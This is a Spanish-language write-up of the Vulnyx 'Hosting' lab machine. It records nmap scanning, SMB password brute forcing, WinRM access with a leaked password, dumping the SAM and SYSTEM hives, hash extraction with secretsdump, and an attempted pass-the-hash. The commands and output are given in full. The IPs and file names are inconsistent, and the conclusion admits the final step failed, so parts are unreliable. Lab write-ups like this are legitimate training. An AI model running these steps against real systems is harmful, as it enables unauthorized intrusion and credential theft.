# Hosting

Plataforma: Vulnyx
OS: Windows
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 5 de abril de 2025 17:01
IP: 192.168.0.63

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Identificamos el sistema viento que la mac es 08:00 correspondiente a VirtualBox. Identificamos sistema operativo por TTL

```bash
whichSystem.py 192.168.0.63                                                                                              
	192.168.0.63 (ttl -> 128): Windows
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.63 -oG targeted

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5040/tcp  open  unknown      syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
7680/tcp  open  pando-pub    syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49670/tcp open  unknown      syn-ack ttl 128
49674/tcp open  unknown      syn-ack ttl 128
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
sudo nmap -p80,135,139,445,5040,5985,7680,47001,49664,49665,49666,49667,49668,49669,49671 -sCV 192.168.0.63-oN targeted

PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5040/tcp  open   unknown
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open   pando-pub?
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp closed unknown
49671/tcp closed unknown
MAC Address: 08:00:27:86:AA:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-05T15:12:12
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: HOSTING, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:86:aa:c5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

Whatweb

```bash
whatweb http://192.168.0.63                                                                                                                             
http://192.168.0.111 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.0.63], Microsoft-IIS[10.0], Title[IIS Windows]
```

- **Identificación de vulnerabilidades**
    - 80 Microsoft-IIS[10.0]

Hacemos fuzzing para ver si encontramos mas directorios

```bash
gobuster dir -u http://192.168.0.63/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt 

/speed               (Status: 200) [Size: 168] [--> http://192.168.0.111/speed

```

Accedemos a la web y vemos una pagina dedicada al alojamiento web, con una seccion en “TEAM” con diferentes nombres de usuario.

Creamos una lista de usuarios con los nombres

```bash
nano users.txt
p.smith
a.krist
m.faeny
k.lendy
```

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### SMB

```bash

```

Al disponer de posibles credenciales de acceso, intentamos usarlos con el modulo de metasploit SMB_login

```bash
msf6> search smb_login
msf6> use use auxiliary/scanner/smb/smb_login
msf6> set RHOSTS 192.168.0.63
msf6> set USER_FILE users.txt
msf6> set PASS_FILE /usr/share/wordlist/rockyou

Encontramos  credenciales válidas para 
p.smith:k****

```

Probamos a enumerar recursos con este usuario

```bash
smbmap -u "p.smith" -p "kissme" -H 192.168.0.63 
[+] IP: 192.168.0.63:445	Name: hosting.nyx         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	IPC$                                              	READ ONLY	IPC remota
```

Enumeramos con crackmapexec usuarios

([https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/))

```bash
crackmapexec  smb 192.168.0.63 -u 'p.smith' -p 'k***' --users 
SMB         192.168.0.111   445    HOSTING          HOSTING\Administrador                  
SMB         192.168.0.111   445    HOSTING          HOSTING\administrator                  
SMB         192.168.0.111   445    HOSTING          HOSTING\DefaultAccount                 
SMB         192.168.0.111   445    HOSTING          HOSTING\f.miller                       
SMB         192.168.0.111   445    HOSTING          HOSTING\Invitado                       
SMB         192.168.0.111   445    HOSTING          HOSTING\j.wilson                       
SMB         192.168.0.111   445    HOSTING          HOSTING\m.davis                        H0$T1nG123!
SMB         192.168.0.111   445    HOSTING          HOSTING\p.smith                        
SMB         192.168.0.111   445    HOSTING          HOSTING\WDAGUtilityAccount            
```

Aparece un password asociado a un usuario. Tratamos de enumerar con ese usuario, pero da error para SMB

```bash
crackmapexec  smb 192.168.0.63 -u 'm.davis' -p 'H0$T1nG123!
SMB         192.168.0.63    445    HOSTING          [*] Windows 10 / Server 2019 Build 19041 x64 (name:HOSTING) (domain:HOSTING) (signing:False) (SMBv1:False)
SMB         192.168.0.63    445    HOSTING          [-] HOSTING\m.davis:H0$T1nG123! STATUS_LOGON_FAILURE 
```

Al tener un password asociado a alguna cuenta, tratamos de ver si alguno permite acceso con winrm ya que esta el puerto abierto

```bash
 crackmapexec  winrm 192.168.0.63 -u 'm.davis' -p 'H0$T1nG123!'  

SMB         192.168.0.63    5985   HOSTING          [*] Windows 10 / Server 2019 Build 19041 (name:HOSTING) (domain:HOSTING)
HTTP        192.168.0.63    5985   HOSTING          [*] http://192.168.0.63:5985/wsman
WINRM       192.168.0.63    5985   HOSTING          [-] HOSTING\m.davis:H0$T1nG123!

 crackmapexec  winrm 192.168.0.63 -u 'j.wilson' -p 'H0$T1nG123!'  
SMB         192.168.0.63    5985   HOSTING          [*] Windows 10 / Server 2019 Build 19041 (name:HOSTING) (domain:HOSTING)
HTTP        192.168.0.63    5985   HOSTING          [*] http://192.168.0.63:5985/wsman
WINRM       192.168.0.63    5985   HOSTING          [+] HOSTING\j.wilson:H0$T1nG123! (Pwn3d!)
```

Tenemos acceso con el usauri j.wilson

```bash
evil-winrm -i 192.168.0.63 -u 'j.wilso'n -p 'H0$T1nG123!'
*Evil-WinRM* PS C:\Users\j.wilson\Documents> 
*Evil-WinRM* PS C:\Users\j.wilson> cd desktop
*Evil-WinRM* PS C:\Users\j.wilson\desktop> dir

    Directorio: C:\Users\j.wilson\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          9/2/2024   7:14 PM             70 user.txt

*Evil-WinRM* PS C:\Users\j.wilson\desktop> type user.txt
50e5a*******************************

```

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

### Escalada de privilegios

Habiendo accedido como usuario j.wilson , ahora vamos a escalar privilegios. Para ello , revisamos que permisos tiene el usuario

```bash
*Evil-WinRM* PS C:\Users\j.wilson\desktop> net user j.wilson
Miembros del grupo local                   *Operadores de copia de seguridad
                                           *Usuarios
                                           *Usuarios de administr
Miembros del grupo global                  *Ninguno
 
*Evil-WinRM* PS C:\Users\j.wilson\desktop> cd c:\
*Evil-WinRM* PS C:\> mkdir temp
*Evil-WinRM* PS C:\> reg save hklm\sam c:\temp\sam.hives
*Evil-WinRM* PS C:\> reg save hklm\system c:\temp\system.hives
*Evil-WinRM* PS C:\> download sam
*Evil-WinRM* PS C:\> download system

# Extraemos los hashes 

impacket-secretsdump -sam sam.hive -system system.hive LOCAL  
[*] Target system bootKey: 0x827cc782adafc2fd1b7b7a48da1e20ba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8afe1e889d0977f8571b3dc0524648aa:::
administrator:1002:aad3b435b51404eeaad3b435b51404ee:41186fb28e283ff758bb3dbeb6fb4a5c:::
p.smith:1003:aad3b435b51404eeaad3b435b51404ee:2cf4020e126a3314482e5e87a3f39508:::
f.miller:1004:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::
m.davis:1005:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::
j.wilson:1006:aad3b435b51404eeaad3b435b51404ee:a6cf5ad66b08624854e80a8786ad6bac:::
[*] Cleaning up... 

Teniendo el hash, utilizamos pass-the-hash para conectar como administrator, ya que la cuenta Adminitrador está deshabilitada:

evil-winrm -i 192.168.0.63 -u administrator -H 41186fb28e283ff758bb3dbeb6fb4a5c 

*Evil-WinRM* PS C:\Users\administrator\desktop>
```

## Conclusión

<aside>
💡 La manera de escalar privilegios es correcta, pero no he logrado acceder mediante el pass-the-hash, a pesar de haber verificado con diferentes writeups el proceso y los hashes

</aside>